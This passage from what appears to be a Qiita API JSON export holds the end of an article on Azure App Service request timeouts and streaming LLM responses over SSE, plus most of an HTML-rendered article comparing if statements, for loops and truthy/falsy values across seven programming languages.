で応答を得ることができます。\n\n[Streaming API responses - OpenAI API](https://platform.openai.com/docs/guides/streaming-responses?api-mode=responses)\n\n[Azure OpenAI の Microsoft Foundry Models v1 REST API リファレンス - Azure OpenAI | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/ai-foundry/openai/latest?view=foundry-classic#azurecreatechatcompletionstreamresponse)\n\nApp Service 等にデプロイしたアプリケーションから LLM の APIを呼び出し、応答を加工してさらにクライアントにSSEで返却することで LLM からの応答が巨大になっても大丈夫ということですね。\n\n参考\n[Azure OpenAIの返答をAzure Functionを中継してStream(SSE)したい](https://zenn.dev/microsoft/articles/azure-openai-stream-azure-function)\n\nまた、最近 サイドカーとしてで Phi-4 を SLM として動作させるチュートリアルがあります。\n[チュートリアル: SLM 拡張機能を使った Express.js チャットボット - Azure App Service | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/app-service/tutorial-ai-slm-expressjs)\n\nここでも SLM の API をストリームとして呼び出し、クライアントへも SSE で中継する実装となっています。\n\nhttps://github.com/Azure-Samples/ai-slm-in-app-service-sidecar/blob/main/use_sidecar_extension/expressapp/src/services/slm_service.js#L19-L40\n\nPhi-4 サイドカーちょっと試してみましたが SKU を渋ると応答がとてつもなく遅い[^1]のでストリーム化は必須と思われます。\n\n[^1]:  P2mv3 レベル以上が推奨されています。https://learn.microsoft.com/ja-jp/azure/app-service/tutorial-ai-slm-fastapi#how-does-pricing-tier-affect-the-performance-of-the-slm-sidecar\n\n# Azure Container Appsはどうなの\n\nAzure Container Apps についても同様の制限があります。\n\n[Azure Container Apps でのイングレス | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/container-apps/ingress-overview#http)\n\n> 要求のタイムアウトは 240 秒です\n\nただし、Premium イングレスを用いることで上限を緩和することが可能です。\n\n[Azure Container Apps 環境でイングレスを構成する | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/container-apps/ingress-environment-configuration?tabs=azure-cli#advanced-ingress-settings)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/1519738c-1d0b-475f-a538-6635d2621b1e.png)\n\nこれは Azure Containe Apps の場合 [マネージドリソース](https://learn.microsoft.com/ja-jp/azure/container-apps/custom-virtual-networks?tabs=workload-profiles-env#managed-resources) として専用のロードバランサーが用意されるため変更可能なものと推測できます。\n\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:21:53+09:00",
      "group": null,
      "id": "7a27f6135c47fdb1f709",
      "likes_count": 1,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Azure",
          "versions": []
        },
        {
          "name": "AzureWebApps",
          "versions": []
        },
        {
          "name": "AzureFunctions",
          "versions": []
        },
        {
          "name": "AppService",
          "versions": []
        },
        {
          "name": "AzureOpenAIService",
          "versions": []
        }
      ],
      "title": "App Service の リクエストタイムアウトとLLMの連携について",
      "updated_at": "2025-12-09T14:21:53+09:00",
      "url": "https://qiita.com/georgeOsdDev@github/items/7a27f6135c47fdb1f709",
      "user": {
        "description": "個人の見解",
        "facebook_id": "",
        "followees_count": 29,
        "followers_count": 22,
        "github_login_name": "georgeOsdDev",
        "id": "georgeOsdDev@github",
        "items_count": 79,
        "linkedin_id": "",
        "location": "",
        "name": "Takeharu Oshida",
        "organization": "Microsoft",
        "permanent_id": 4914,
        "profile_image_url": "https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/profile-images/1557367194",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h2 data-sourcepos=\"2:1-2:15\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h2>\n<p data-sourcepos=\"4:1-4:39\">「Rubyでは <code>0</code> は偽ではない」</p>\n<p data-sourcepos=\"6:1-6:198\">書籍『コーディングを支える技術』を読んで、言語によって「真偽値」の扱いが異なることを学び、各言語の設計思想の違いに興味を持ちました。</p>\n<p data-sourcepos=\"8:1-8:320\">本記事では、7つのプログラミング言語の<strong>if文・for文の書き方</strong>と<strong>真偽値の扱い</strong>を比較します。新しい言語を学ぶ際や、複数言語を扱う仕事での「あれ、この言語ではどう書くんだっけ？」という混乱を解消する一助になれば幸いです。</p>\n<h2 data-sourcepos=\"10:1-10:21\">\n<span id=\"比較する言語\" class=\"fragment\"></span><a href=\"#%E6%AF%94%E8%BC%83%E3%81%99%E3%82%8B%E8%A8%80%E8%AA%9E\"><i class=\"fa fa-link\"></i></a>比較する言語</h2>\n<table data-sourcepos=\"12:1-20:69\">\n<thead>\n<tr data-sourcepos=\"12:1-12:19\">\n<th data-sourcepos=\"12:2-12:9\">言語</th>\n<th data-sourcepos=\"12:11-12:18\">特徴</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"14:1-14:54\">\n<td data-sourcepos=\"14:2-14:9\"><strong>C#</strong></td>\n<td data-sourcepos=\"14:11-14:53\">.NET の主力言語、型安全性重視</td>\n</tr>\n<tr data-sourcepos=\"15:1-15:75\">\n<td data-sourcepos=\"15:2-15:11\"><strong>Java</strong></td>\n<td data-sourcepos=\"15:13-15:74\">エンタープライズの定番、厳格な型システム</td>\n</tr>\n<tr data-sourcepos=\"16:1-16:67\">\n<td data-sourcepos=\"16:2-16:9\"><strong>Go</strong></td>\n<td data-sourcepos=\"16:11-16:66\">シンプルさを追求、括弧を省略した構文</td>\n</tr>\n<tr data-sourcepos=\"17:1-17:72\">\n<td data-sourcepos=\"17:2-17:17\"><strong>TypeScript</strong></td>\n<td data-sourcepos=\"17:19-17:71\">JavaScript に型を追加、truthy/falsy の概念</td>\n</tr>\n<tr data-sourcepos=\"18:1-18:74\">\n<td data-sourcepos=\"18:2-18:13\"><strong>Python</strong></td>\n<td data-sourcepos=\"18:15-18:73\">インデントでブロックを表現、可読性重視</td>\n</tr>\n<tr data-sourcepos=\"19:1-19:78\">\n<td data-sourcepos=\"19:2-19:11\"><strong>Ruby</strong></td>\n<td data-sourcepos=\"19:13-19:77\">すべてがオブジェクト、<code>nil</code> と <code>false</code> のみが偽</td>\n</tr>\n<tr data-sourcepos=\"20:1-20:69\">\n<td data-sourcepos=\"20:2-20:11\"><strong>Rust</strong></td>\n<td data-sourcepos=\"20:13-20:68\">安全性とパフォーマンス、式指向の設計</td>\n</tr>\n</tbody>\n</table>\n<hr data-sourcepos=\"22:1-23:0\">\n<h2 data-sourcepos=\"24:1-24:24\">\n<span id=\"1-真偽値の扱い\" class=\"fragment\"></span><a href=\"#1-%E7%9C%9F%E5%81%BD%E5%80%A4%E3%81%AE%E6%89%B1%E3%81%84\"><i class=\"fa fa-link\"></i></a>1. 真偽値の扱い</h2>\n<h3 data-sourcepos=\"26:1-26:46\">\n<span id=\"各言語で偽とみなされる値\" class=\"fragment\"></span><a href=\"#%E5%90%84%E8%A8%80%E8%AA%9E%E3%81%A7%E5%81%BD%E3%81%A8%E3%81%BF%E3%81%AA%E3%81%95%E3%82%8C%E3%82%8B%E5%80%A4\"><i class=\"fa fa-link\"></i></a>各言語で「偽」とみなされる値</h3>\n<p data-sourcepos=\"28:1-28:66\">これが言語間で最も混乱しやすいポイントです。</p>\n<table data-sourcepos=\"30:1-38:68\">\n<thead>\n<tr data-sourcepos=\"30:1-30:48\">\n<th data-sourcepos=\"30:2-30:9\">言語</th>\n<th data-sourcepos=\"30:11-30:47\">偽（falsy）とみなされる値</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"32:1-32:55\">\n<td data-sourcepos=\"32:2-32:9\"><strong>C#</strong></td>\n<td data-sourcepos=\"32:11-32:54\">\n<code>false</code> のみ（<code>0</code> は偽ではない）</td>\n</tr>\n<tr data-sourcepos=\"33:1-33:57\">\n<td data-sourcepos=\"33:2-33:11\"><strong>Java</strong></td>\n<td data-sourcepos=\"33:13-33:56\">\n<code>false</code> のみ（<code>0</code> は偽ではない）</td>\n</tr>\n<tr data-sourcepos=\"34:1-34:55\">\n<td data-sourcepos=\"34:2-34:9\"><strong>Go</strong></td>\n<td data-sourcepos=\"34:11-34:54\">\n<code>false</code> のみ（<code>0</code> は偽ではない）</td>\n</tr>\n<tr data-sourcepos=\"35:1-35:70\">\n<td data-sourcepos=\"35:2-35:20\"><strong>TypeScript/JS</strong></td>\n<td data-sourcepos=\"35:22-35:69\">\n<code>false</code>, <code>0</code>, <code>\"\"</code>, <code>null</code>, <code>undefined</code>, <code>NaN</code>\n</td>\n</tr>\n<tr data-sourcepos=\"36:1-36:61\">\n<td data-sourcepos=\"36:2-36:13\"><strong>Python</strong></td>\n<td data-sourcepos=\"36:15-36:60\">\n<code>False</code>, <code>0</code>, <code>\"\"</code>, <code>[]</code>, <code>{}</code>, <code>None</code>, etc.</td>\n</tr>\n<tr data-sourcepos=\"37:1-37:65\">\n<td data-sourcepos=\"37:2-37:11\"><strong>Ruby</strong></td>\n<td data-sourcepos=\"37:13-37:64\">\n<code>false</code>, <code>nil</code> のみ（<strong><code>0</code> や <code>\"\"</code> は真</strong>）</td>\n</tr>\n<tr data-sourcepos=\"38:1-38:68\">\n<td data-sourcepos=\"38:2-38:11\"><strong>Rust</strong></td>\n<td data-sourcepos=\"38:13-38:67\">\n<code>false</code> のみ（他の型は条件に使用不可）</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"40:1-40:39\">\n<span id=\"コード例0-は真か偽か\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%BC%E3%83%89%E4%BE%8B0-%E3%81%AF%E7%9C%9F%E3%81%8B%E5%81%BD%E3%81%8B\"><i class=\"fa fa-link\"></i></a>コード例：0 は真か偽か？</h3>\n<div class=\"code-frame\" data-lang=\"csharp\" data-sourcepos=\"42:1-45:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// C# - コンパイルエラー！int は bool に暗黙変換できない</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"m\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"p\">}</span> <span class=\"c1\">// error CS0029</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"47:1-50:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Java - コンパイルエラー！int は boolean に変換できない</span>\n<span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"o\">}</span> <span class=\"c1\">// error: incompatible types</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"52:1-55:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// Go - コンパイルエラー！int は bool ではない</span>\n<span class=\"k\">if</span> <span class=\"m\">0</span> <span class=\"p\">{</span> <span class=\"p\">}</span> <span class=\"c\">// non-bool 0 (type int) used as if condition</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"57:1-64:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// TypeScript/JavaScript - 0 は falsy なので \"偽\" と表示</span>\n<span class=\"k\">if </span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">真</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">偽</span><span class=\"dl\">\"</span><span class=\"p\">);</span> <span class=\"c1\">// こちらが実行される</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"66:1-72:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Python - 0 は falsy なので \"偽\" と表示\n</span><span class=\"k\">if</span> <span class=\"mi\">0</span><span class=\"p\">:</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">真</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"k\">else</span><span class=\"p\">:</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">偽</span><span class=\"sh\">\"</span><span class=\"p\">)</span>  <span class=\"c1\"># こちらが実行される\n</span></code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"74:1-81:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Ruby - 0 は truthy なので \"真\" と表示！</span>\n<span class=\"k\">if</span> <span class=\"mi\">0</span>\n  <span class=\"nb\">puts</span> <span class=\"s2\">\"真\"</span>  <span class=\"c1\"># こちらが実行される</span>\n<span class=\"k\">else</span>\n  <span class=\"nb\">puts</span> <span class=\"s2\">\"偽\"</span>\n<span class=\"k\">end</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"83:1-86:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Rust - コンパイルエラー！bool 型のみ条件に使用可能</span>\n<span class=\"k\">if</span> <span class=\"mi\">0</span> <span class=\"p\">{</span> <span class=\"p\">}</span> <span class=\"c1\">// expected `bool`, found integer</span>\n</code></pre></div></div>\n<div data-sourcepos=\"88:1-90:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"89:1-89:187\"><strong>Ruby の罠</strong>: C言語経験者がRubyを書くと、<code>if count</code> のような条件で <code>count = 0</code> のときに真になってしまい、バグの原因になることがあります。</p>\n</div>\n</div>\n<hr data-sourcepos=\"92:1-93:0\">\n<h2 data-sourcepos=\"94:1-94:27\">\n<span id=\"2-if-文の構文比較\" class=\"fragment\"></span><a href=\"#2-if-%E6%96%87%E3%81%AE%E6%A7%8B%E6%96%87%E6%AF%94%E8%BC%83\"><i class=\"fa fa-link\"></i></a>2. if 文の構文比較</h2>\n<h3 data-sourcepos=\"96:1-96:24\">\n<span id=\"基本的な-if-else\" class=\"fragment\"></span><a href=\"#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA-if-else\"><i class=\"fa fa-link\"></i></a>基本的な if-else</h3>\n<div class=\"code-frame\" data-lang=\"csharp\" data-sourcepos=\"98:1-107:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// C#</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"err\">条件</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"err\">条件</span><span class=\"m\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"109:1-118:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Java - C# とほぼ同じ</span>\n<span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">条件</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">条件2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"120:1-129:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// Go - 条件の括弧が不要、波括弧は必須</span>\n<span class=\"k\">if</span> <span class=\"n\">条件</span> <span class=\"p\">{</span>\n    <span class=\"c\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"n\">条件2</span> <span class=\"p\">{</span>\n    <span class=\"c\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"c\">// 処理</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"131:1-140:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// TypeScript - C# と同じ構文</span>\n<span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">条件</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">条件2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"142:1-150:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Python - インデントでブロックを表現、elif を使用\n</span><span class=\"k\">if</span> <span class=\"n\">条件</span><span class=\"p\">:</span>\n    <span class=\"c1\"># 処理\n</span><span class=\"k\">elif</span> <span class=\"n\">条件2</span><span class=\"p\">:</span>\n    <span class=\"c1\"># 処理\n</span><span class=\"k\">else</span><span class=\"p\">:</span>\n    <span class=\"c1\"># 処理\n</span></code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"152:1-161:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Ruby - end で閉じる、elsif を使用</span>\n<span class=\"k\">if</span> <span class=\"n\">条件</span>\n  <span class=\"c1\"># 処理</span>\n<span class=\"k\">elsif</span> <span class=\"n\">条件2</span>\n  <span class=\"c1\"># 処理</span>\n<span class=\"k\">else</span>\n  <span class=\"c1\"># 処理</span>\n<span class=\"k\">end</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"163:1-172:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Rust - 条件の括弧は不要、波括弧は必須</span>\n<span class=\"k\">if</span> <span class=\"n\">条件</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"n\">条件2</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 処理</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"174:1-174:19\">\n<span id=\"構文比較表\" class=\"fragment\"></span><a href=\"#%E6%A7%8B%E6%96%87%E6%AF%94%E8%BC%83%E8%A1%A8\"><i class=\"fa fa-link\"></i></a>構文比較表</h3>\n<table data-sourcepos=\"176:1-184:43\">\n<thead>\n<tr data-sourcepos=\"176:1-176:53\">\n<th data-sourcepos=\"176:2-176:9\">言語</th>\n<th data-sourcepos=\"176:11-176:27\">条件の括弧</th>\n<th data-sourcepos=\"176:29-176:42\">ブロック</th>\n<th data-sourcepos=\"176:44-176:52\">else if</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"178:1-178:39\">\n<td data-sourcepos=\"178:2-178:5\">C#</td>\n<td data-sourcepos=\"178:7-178:19\">必須 <code>()</code>\n</td>\n<td data-sourcepos=\"178:21-178:26\"><code>{}</code></td>\n<td data-sourcepos=\"178:28-178:38\"><code>else if</code></td>\n</tr>\n<tr data-sourcepos=\"179:1-179:41\">\n<td data-sourcepos=\"179:2-179:7\">Java</td>\n<td data-sourcepos=\"179:9-179:21\">必須 <code>()</code>\n</td>\n<td data-sourcepos=\"179:23-179:28\"><code>{}</code></td>\n<td data-sourcepos=\"179:30-179:40\"><code>else if</code></td>\n</tr>\n<tr data-sourcepos=\"180:1-180:41\">\n<td data-sourcepos=\"180:2-180:5\">Go</td>\n<td data-sourcepos=\"180:7-180:14\">不要</td>\n<td data-sourcepos=\"180:16-180:28\">\n<code>{}</code> 必須</td>\n<td data-sourcepos=\"180:30-180:40\"><code>else if</code></td>\n</tr>\n<tr data-sourcepos=\"181:1-181:47\">\n<td data-sourcepos=\"181:2-181:13\">TypeScript</td>\n<td data-sourcepos=\"181:15-181:27\">必須 <code>()</code>\n</td>\n<td data-sourcepos=\"181:29-181:34\"><code>{}</code></td>\n<td data-sourcepos=\"181:36-181:46\"><code>else if</code></td>\n</tr>\n<tr data-sourcepos=\"182:1-182:46\">\n<td data-sourcepos=\"182:2-182:9\">Python</td>\n<td data-sourcepos=\"182:11-182:18\">不要</td>\n<td data-sourcepos=\"182:20-182:36\">インデント</td>\n<td data-sourcepos=\"182:38-182:45\"><code>elif</code></td>\n</tr>\n<tr data-sourcepos=\"183:1-183:35\">\n<td data-sourcepos=\"183:2-183:7\">Ruby</td>\n<td data-sourcepos=\"183:9-183:16\">不要</td>\n<td data-sourcepos=\"183:18-183:24\"><code>end</code></td>\n<td data-sourcepos=\"183:26-183:34\"><code>elsif</code></td>\n</tr>\n<tr data-sourcepos=\"184:1-184:43\">\n<td data-sourcepos=\"184:2-184:7\">Rust</td>\n<td data-sourcepos=\"184:9-184:16\">不要</td>\n<td data-sourcepos=\"184:18-184:30\">\n<code>{}</code> 必須</td>\n<td data-sourcepos=\"184:32-184:42\"><code>else if</code></td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"186:1-186:34\">\n<span id=\"各言語の特徴注意点\" class=\"fragment\"></span><a href=\"#%E5%90%84%E8%A8%80%E8%AA%9E%E3%81%AE%E7%89%B9%E5%BE%B4%E6%B3%A8%E6%84%8F%E7%82%B9\"><i class=\"fa fa-link\"></i></a>各言語の特徴・注意点</h3>\n<h4 data-sourcepos=\"188:1-188:42\">\n<span id=\"go-if-文で変数宣言ができる\" class=\"fragment\"></span><a href=\"#go-if-%E6%96%87%E3%81%A7%E5%A4%89%E6%95%B0%E5%AE%A3%E8%A8%80%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Go: if 文で変数宣言ができる</h4>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"190:1-196:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// 変数のスコープを if ブロック内に限定できる</span>\n<span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">:=</span> <span class=\"n\">doSomething</span><span class=\"p\">();</span> <span class=\"n\">err</span> <span class=\"o\">!=</span> <span class=\"no\">nil</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">err</span>\n<span class=\"p\">}</span>\n<span class=\"c\">// err はここでは使えない</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"198:1-198:44\">\n<span id=\"rust-if-は式なので値を返せる\" class=\"fragment\"></span><a href=\"#rust-if-%E3%81%AF%E5%BC%8F%E3%81%AA%E3%81%AE%E3%81%A7%E5%80%A4%E3%82%92%E8%BF%94%E3%81%9B%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Rust: if は式なので値を返せる</h4>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"200:1-202:3\"><div class=\"highlight\"><pre><code><span class=\"k\">let</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"k\">if</span> <span class=\"n\">score</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">60</span> <span class=\"p\">{</span> <span class=\"s\">\"合格\"</span> <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span> <span class=\"s\">\"不合格\"</span> <span class=\"p\">};</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"204:1-204:33\">\n<span id=\"ruby-後置-if-が使える\" class=\"fragment\"></span><a href=\"#ruby-%E5%BE%8C%E7%BD%AE-if-%E3%81%8C%E4%BD%BF%E3%81%88%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Ruby: 後置 if が使える</h4>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"206:1-208:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">puts</span> <span class=\"s2\">\"成人です\"</span> <span class=\"k\">if</span> <span class=\"n\">age</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">18</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"210:1-210:49\">\n<span id=\"python-三項演算子の書き方が独特\" class=\"fragment\"></span><a href=\"#python-%E4%B8%89%E9%A0%85%E6%BC%94%E7%AE%97%E5%AD%90%E3%81%AE%E6%9B%B8%E3%81%8D%E6%96%B9%E3%81%8C%E7%8B%AC%E7%89%B9\"><i class=\"fa fa-link\"></i></a>Python: 三項演算子の書き方が独特</h4>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"212:1-214:3\"><div class=\"highlight\"><pre><code><span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">合格</span><span class=\"sh\">\"</span> <span class=\"k\">if</span> <span class=\"n\">score</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">60</span> <span class=\"k\">else</span> <span class=\"sh\">\"</span><span class=\"s\">不合格</span><span class=\"sh\">\"</span>\n</code></pre></div></div>\n<hr data-sourcepos=\"216:1-217:0\">\n<h2 data-sourcepos=\"218:1-218:43\">\n<span id=\"3-for-文ループの構文比較\" class=\"fragment\"></span><a href=\"#3-for-%E6%96%87%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E6%A7%8B%E6%96%87%E6%AF%94%E8%BC%83\"><i class=\"fa fa-link\"></i></a>3. for 文（ループ）の構文比較</h2>\n<h3 data-sourcepos=\"220:1-220:40\">\n<span id=\"配列の要素を順に処理する\" class=\"fragment\"></span><a href=\"#%E9%85%8D%E5%88%97%E3%81%AE%E8%A6%81%E7%B4%A0%E3%82%92%E9%A0%86%E3%81%AB%E5%87%A6%E7%90%86%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>配列の要素を順に処理する</h3>\n<div class=\"code-frame\" data-lang=\"csharp\" data-sourcepos=\"222:1-233:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// C# - foreach を使用</span>\n<span class=\"kt\">var</span> <span class=\"n\">items</span> <span class=\"p\">=</span> <span class=\"k\">new</span><span class=\"p\">[]</span> <span class=\"p\">{</span> <span class=\"m\">1</span><span class=\"p\">,</span> <span class=\"m\">2</span><span class=\"p\">,</span> <span class=\"m\">3</span> <span class=\"p\">};</span>\n<span class=\"k\">foreach</span> <span class=\"p\">(</span><span class=\"kt\">var</span> <span class=\"n\">item</span> <span class=\"k\">in</span> <span class=\"n\">items</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"nf\">WriteLine</span><span class=\"p\">(</span><span class=\"n\">item</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 従来の for 文</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"p\">=</span> <span class=\"m\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"p\">&lt;</span> <span class=\"n\">items</span><span class=\"p\">.</span><span class=\"n\">Length</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"p\">++)</span> <span class=\"p\">{</span>\n    <span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"nf\">WriteLine</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"235:1-246:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Java - 拡張 for 文</span>\n<span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"o\">{</span> <span class=\"mi\">1</span><span class=\"o\">,</span> <span class=\"mi\">2</span><span class=\"o\">,</span> <span class=\"mi\">3</span> <span class=\"o\">};</span>\n<span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">item</span> <span class=\"o\">:</span> <span class=\"n\">items</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">item</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"c1\">// 従来の for 文</span>\n<span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">items</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n    <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">items</span><span class=\"o\">[</span><span 